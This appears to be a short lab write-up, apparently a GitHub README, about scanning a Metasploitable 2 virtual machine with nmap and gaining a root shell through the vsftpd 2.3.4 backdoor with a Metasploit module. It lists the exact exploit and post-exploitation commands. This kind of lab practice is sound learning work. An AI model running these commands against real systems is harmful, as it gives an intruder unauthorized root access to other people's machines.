

## 🎯 Target Information
- **Target IP**: `192.168.56.101`
- **System**: Metasploitable 2
- **Vulnerable Service**: FTP (vsftpd 2.3.4)
- **Port**: 21/tcp

## 🔍 Scanning Results (Nmap)
nmap -sV -sC -O -oN scan.txt 192.168.56.101
![image](https://github.com/user-attachments/assets/62de0928-4d86-497c-9f76-3d1cadc55080)
```
I conducted the nmap scan on the given IP so I could know the given vulnerability present 
```
# Result:
![image](https://github.com/user-attachments/assets/9f995d14-400d-4f93-bd1c-167787794a72)
21/tcp open  ftp     vsftpd 2.3.4
```
You can see the result there is open port which is 21 and has vstfpd 2.3.4 as version which has exploitation 
```



## 💣 Exploitation (Metasploit):



![image](https://github.com/user-attachments/assets/c787d4ae-13cf-4db1-85fb-4ae0b88b5677)
![image](https://github.com/user-attachments/assets/d9aa1f10-4700-4a71-8038-de4aed8aa8fd)
![image](https://github.com/user-attachments/assets/520ab200-1ae4-49fb-ac6e-7345660eede4)
![image](https://github.com/user-attachments/assets/81415b7d-1f72-4a0b-9fd7-06aac8e526d3)
```
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.101
exploit

This above are the commands I ran without the use of payload so that I can access the  targets device because of its vulnerability.
```

🖥️ Shell Access
![image](https://github.com/user-attachments/assets/af1a541b-2898-44b4-9ab4-a809f4279509)

```
sessions -i 1
whoami
uname -a

This to know if we have the control over the device of targets IP
````

 Result
Successfully gained command shell as root
Confirmed RCE via the FTP backdoor.
